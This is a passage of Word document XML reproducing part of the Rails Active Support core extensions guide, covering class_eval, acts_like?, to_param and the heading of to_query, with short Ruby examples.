    <w:p w14:paraId="4571445D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/try.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25588D96" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_eval(*args, &amp;block)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513C7940" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can evaluate code in the context of any object’s singleton class using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_eval</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="480C2C18" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18046A36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Proc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C6B6AE9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>bind(object)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FF16FEB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    block, time = self, Time.now</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C5F6D34" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    object.class_eval do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63ED2DC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      method_name = "__bind_#{time.to_i}_#{time.usec}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D01BC28" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      define_method(method_name, &amp;block)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="669BF8FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      method = instance_method(method_name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08ABCD11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      remove_method(method_name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41E6BFC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      method</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C57C40E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end.bind(object)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E091E9B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EE81221" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16045FBA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/kernel/singleton_class.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D90F3A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>acts_like?(duck)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622A07CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>acts_like</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> provides a way to check whether some class acts like some other class based on a simple convention: a class that provides the same interface as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>String</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defines</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2448"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="75C193EA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="017A1440" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>acts_like_string?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43678762" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E547118" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>which is only a marker, its body or return value are irrelevant. Then, client code can query for duck-type-safeness this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="550F81A9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28836D94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1964193176"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>some_klass.acts_like?(:string)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4EEE0164" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails has classes that act like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and follow this contract.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB840BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/acts_like.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069812E4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131956D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">All objects in Rails respond to the method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which is meant to return something that represents them as values in a query string, or as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fragments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E258824" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> just calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_s</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2EFE35E1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="10E4A798" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1262908110"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>7.to_param # =&gt; "7"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6965D366" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The return value of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> should </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> be escaped:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="00B0B3E1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="026BE805" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="590313316"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Tom &amp; Jerry".to_param # =&gt; "Tom &amp; Jerry"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="15F16ABA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Several classes in Rails overwrite this method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69981D94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return themselves. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array#to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the elements and joins the result with “/”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0878A214" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0BB3B6CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="514269781"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[0, true, String].to_param # =&gt; "0/true/String"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16EE974F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Notably, the Rails routing system calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on models to get a value for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> placeholder. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base#to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of a model, but you can redefine that method in your models. For example, given</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0C9CFC95" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A2F7476" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6993A6A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>to_param</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="606C97E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    "#{id}-#{name.parameterize}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="410C46D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F06A2B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D929925" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>we get:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2CE37C7C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C0A2968" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1125344281"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>user_path(@user) # =&gt; "/users/357-john-smith"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E2B64B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Controllers need to be aware of any redefinition of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> because when a request like that comes in “357-john-smith” is the value of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>params[:id]</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C34E6B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/to_param.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA43078" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_query</w:t>
      </w:r>
